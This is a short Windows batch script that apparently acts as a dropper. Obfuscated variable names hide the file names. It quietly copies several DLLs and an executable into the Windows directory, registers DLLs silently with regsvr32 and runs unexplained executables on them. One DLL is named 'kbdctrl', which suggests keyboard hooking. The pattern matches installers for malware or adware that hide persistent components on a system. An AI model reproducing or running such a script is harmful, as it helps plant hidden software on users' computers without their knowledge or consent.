@echo   off

set     s10361204103612=kbdctrl
set      g16436206164362=qdertu
set       d18916207189162=regsvr32.exe
set      g17031203170312=neobus
set   a12343701123437=ipwypwpk
set   r13790005137900=emqd
set       h14561202145612=bonrep

copy   %s10361204103612%.dll   %windir%\%s10361204103612%.dll  >nul
copy      %h14561202145612%.dll     %windir%
copy    %g17031203170312%.dll   %windir%\%g17031203170312%.dll  >nul
copy   %g16436206164362%.exe  %windir%       >nul
copy  %a12343701123437%.dll      %windir%     >nul

%d18916207189162%     /s     %h14561202145612%.dll
%r13790005137900%.exe   %windir%\%g17031203170312%.dll   %g17031203170312%
%windir%\system32\%d18916207189162%   /s  %windir%\%a12343701123437%.dll
%r13790005137900%.exe    %windir%\%s10361204103612%.dll   %s10361204103612%

%g16436206164362%.exe     reg
%r13790005137900%.exe      reovg
